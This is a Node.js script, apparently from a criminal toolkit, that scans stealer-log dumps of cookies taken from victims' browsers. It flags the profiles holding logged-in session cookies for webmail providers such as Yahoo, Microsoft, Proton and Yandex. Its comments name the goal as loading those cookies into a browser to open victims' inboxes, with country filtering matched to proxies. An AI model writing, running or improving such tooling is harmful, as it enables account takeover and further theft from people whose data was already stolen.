#!/usr/bin/env node
/**
 * scan_email_providers.mjs
 *
 * Scan a stealer-log cookie dump for profiles carrying cookies of web-based
 * email providers OTHER than Google/Gmail, and report which profiles have a
 * cookie set that could plausibly be loaded into a browser to open that inbox.
 *
 * For every profile folder (one with a Cookies/ dir) it parses the Netscape
 * cookie files and checks each provider's host domains. A profile counts as:
 *   - "present":  it has at least one cookie on the provider's host(s)
 *   - "logged-in": it additionally carries the provider's primary AUTH cookie
 *                  (e.g. Yahoo `SID`, Microsoft `ESTSAUTHPERSISTENT`, Yandex
 *                  `Session_id`). `logged-in` is the one worth loading.
 *
 * Country prefix is read from the folder name (the ISO-2 letters before the
 * 16+ char token), matching the proxy geo-matching used elsewhere.
 *
 * Usage:
 *   node scripts/scan_email_providers.mjs "<dumpRoot>" \
 *       [--provider yahoo] [--country IN] [--logged-in] [--json out.json]
 *
 *   --provider  only this provider (yahoo|microsoft|gmx|mailcom|proton|yandex|icloud|mailru|zoho|aol|tuta|fastmail)
 *   --country   only profiles whose folder country prefix matches (e.g. IN)
 *   --logged-in only profiles that carry the provider's primary auth cookie
 *   --json      write machine-readable results to a file
 */

import * as fs from 'fs';
import * as path from 'path';

const argv = process.argv.slice(2);
const flag = (name, def) => {
  const i = argv.indexOf(`--${name}`);
  return i !== -1 && argv[i + 1] ? argv[i + 1] : def;
};
const root = argv.find((a) => a && !a.startsWith('-'));
const provider = flag('provider', null);
const country = flag('country', null)?.toUpperCase() || null;
const onlyLoggedIn = argv.includes('--logged-in');
const jsonOut = flag('json', null);

/** Providers: {key, hostRe (domain substring), auth (name => logged-in auth cookie)} */
const PROVIDERS = [
  { key: 'yahoo',     host: /yahoo/,                        auth: ['SID'] },
  { key: 'microsoft', host: /(live\.com|outlook\.|microsoftonline|login\.windows\.net|hotmail)/, auth: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CSPAuth', 'RPSSAuth'] },
  { key: 'gmx',       host: /gmx\./,                        auth: ['JSESSIONID', 'ing'] },
  { key: 'mailcom',   host: /\.mail\.com$/,                 auth: ['gfid'] },
  { key: 'proton',    host: /proton\.me|proton\.com|protonmail/, auth: ['session'] },
  { key: 'yandex',    host: /yandex/,                       auth: ['Session_id'] },
  { key: 'icloud',    host: /icloud\.com|apple\.com|appleid/, auth: ['sess'] },
  { key: 'mailru',    host: /mail\.ru/,                     auth: ['Mpop'] },
  { key: 'zoho',      host: /zoho/,                         auth: ['zohocookie'] },
  { key: 'aol',       host: /aol\.com/,                     auth: ['SID'] },
  { key: 'tuta',      host: /tuta\.com|tuta\.io|tutanota/,  auth: ['session'] },
  { key: 'fastmail',  host: /fastmail\./,                   auth: ['session'] },
];

if (!root || !fs.existsSync(root)) {
  console.error('Usage: node scripts/scan_email_providers.mjs "<dumpRoot>" [--provider <key>] [--country CC] [--logged-in] [--json out.json]');
  process.exit(1);
}

/** All Cookies/*.txt paths under a profile dir (listdir — glob breaks on paths containing `[`/`]`). */
function cookieFiles(profileDir) {
  const d = path.join(profileDir, 'Cookies');
  if (!fs.existsSync(d)) return [];
  return fs.readdirSync(d).filter((f) => f.endsWith('.txt')).map((f) => path.join(d, f));
}

/** Parse one Netscape-format cookies file -> [{domain, name, value, path, secure, expires}]. */
function parseNetscape(file) {
  const out = [];
  for (const raw of fs.readFileSync(file, 'utf8').split('\n')) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const p = line.split('\t');
    if (p.length < 7) continue;
    out.push({ domain: p[0], path: p[2] ?? '/', secure: p[3] === 'TRUE', expires: Number(p[4]) || 0, name: p[5], value: p.slice(6).join('\t') });
  }
  return out;
}

/** ISO-2 country prefix from a profile folder name, or null. */
function countryOf(profileDir) {
  const m = / - ([A-Z]{2})[A-Z0-9]/.exec(path.basename(profileDir));
  return m ? m[1] : null;
}

// --- collect profile dirs ---
const profiles = [];
const stack = [root];
while (stack.length) {
  const dir = stack.pop();
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { continue; }
  for (const e of entries) {
    const full = path.join(dir, e.name);
    if (e.isDirectory()) {
      if (fs.existsSync(path.join(full, 'Cookies'))) profiles.push(full);
      stack.push(full);
    }
  }
}
console.error(`Scanning ${profiles.length} profiles under ${root}...`);

// --- scan ---
const results = []; // {profile, country, provider, names[]}
for (const profile of profiles) {
  const cc = countryOf(profile);
  if (country && cc !== country) continue;

  const names = new Set();
  const hosts = new Set();
  for (const f of cookieFiles(profile)) {
    for (const c of parseNetscape(f)) {
      hosts.add(c.domain.toLowerCase());
      names.add(c.name);
    }
  }

  for (const prov of PROVIDERS) {
    const onHost = [...hosts].some((h) => prov.host.test(h));
    if (!onHost) continue;
    const present = [...names].filter((n) => prov.auth.includes(n));
    if (onlyLoggedIn && present.length === 0) continue;
    if (provider && provider !== prov.key) continue;
    results.push({ profile, country: cc, provider: prov.key, authNames: present });
  }
}

// --- aggregate ---
const byProv = {};
for (const r of results) {
  byProv[r.provider] = byProv[r.provider] || { present: 0, loggedIn: 0, profiles: [] };
  byProv[r.provider].present++;
  if (r.authNames.length) {
    byProv[r.provider].loggedIn++;
    if (byProv[r.provider].profiles.length < 30) {
      byProv[r.provider].profiles.push({ profile: r.profile, country: r.country, auth: r.authNames });
    }
  }
}

const lines = [];
if (provider) {
  const p = byProv[provider];
  const label = p ? `${p.loggedIn} logged-in / ${p.present} with any cookie` : 'not found';
  lines.push(`=== ${provider}: ${label} ===`);
  (p ? p.profiles : []).forEach((r) => lines.push(`  [${r.country}] ${path.basename(r.profile)}  auth: ${r.auth.join('/')}`));
} else {
  lines.push('=== Profiles carrying auth cookies per email provider ===');
  for (const prov of PROVIDERS) {
    const d = byProv[prov.key] || { present: 0, loggedIn: 0, profiles: [] };
    lines.push(`${prov.key.padEnd(10)} ${String(d.present).padStart(4)} any-cookie, ${String(d.loggedIn).padStart(4)} logged-in`);
    d.profiles.forEach((r) => lines.push(`    [${r.country}] ${path.basename(r.profile).slice(0, 48)}  auth: ${r.auth.join('/')}`));
  }
}

console.log(lines.join('\n'));

if (jsonOut) {
  const out = Object.fromEntries(
    PROVIDERS.map((p) => [p.key, { present: byProv[p.key]?.present || 0, loggedIn: byProv[p.key]?.loggedIn || 0 }])
  );
  fs.writeFileSync(jsonOut, JSON.stringify({ root, checkedProfiles: profiles.length, providers: out, results, rows: results }, null, 2));
  console.log(`\nWrote full results → ${jsonOut}`);
}